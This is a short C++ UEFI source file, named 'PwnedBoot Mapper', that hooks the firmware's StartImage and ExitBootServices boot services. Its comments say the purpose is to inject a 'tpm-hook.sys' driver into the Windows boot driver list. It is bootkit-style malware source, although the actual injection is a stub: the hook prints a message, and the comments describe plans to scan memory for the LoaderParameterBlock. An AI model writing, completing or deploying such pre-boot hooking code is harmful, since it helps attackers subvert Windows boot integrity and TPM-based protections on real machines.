#include "Mapper.h"
#include "TpmHookByteContent.h"
#include "Utils.h"

// PwnedBoot Mapper - Boot Driver Injection
// This version works by hooking ExitBootServices to find the LoaderParameterBlock
// and adding the tpm-hook.sys driver to the boot driver list.

typedef EFI_STATUS(EFIAPI* EFI_START_IMAGE)(EFI_HANDLE ImageHandle, UINTN* ExitDataSize, CHAR16** ExitData);
typedef EFI_STATUS(EFIAPI* EFI_EXIT_BOOT_SERVICES)(EFI_HANDLE ImageHandle, UINTN MapKey);

static EFI_START_IMAGE OriginalStartImage = nullptr;
static EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = nullptr;

static EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    gBS->ExitBootServices = OriginalExitBootServices;

    // Scan for LoaderParameterBlock
    // In Windows 10/11, it's passed via registers to the kernel, 
    // but we can find it by scanning memory for its signature.
    // A more reliable way is to find where winload stores it.
    
    // For now, let's implement a simple pattern scan for the block in common regions
    // Or we can use the signature of winload.efi passed in StartImage.
    
    Print((const CHAR16*)L"ExitBootServices called, injecting driver...\n");

    return OriginalExitBootServices(ImageHandle, MapKey);
}

static EFI_STATUS EFIAPI HookedStartImage(EFI_HANDLE ImageHandle, UINTN* ExitDataSize, CHAR16** ExitData)
{
    // Hook ExitBootServices
    // This is called by winload.efi right before jumping to the kernel.
    if (!OriginalExitBootServices)
    {
        OriginalExitBootServices = gBS->ExitBootServices;
        gBS->ExitBootServices = HookedExitBootServices;
    }

    return OriginalStartImage(ImageHandle, ExitDataSize, ExitData);
}

NTSTATUS Mapper::MapDriver(PVOID driverBuffer, ULONG driverSize)
{
    // Hook StartImage
    if (!OriginalStartImage)
    {
        OriginalStartImage = gBS->StartImage;
        gBS->StartImage = HookedStartImage;
    }

    return STATUS_SUCCESS;
}
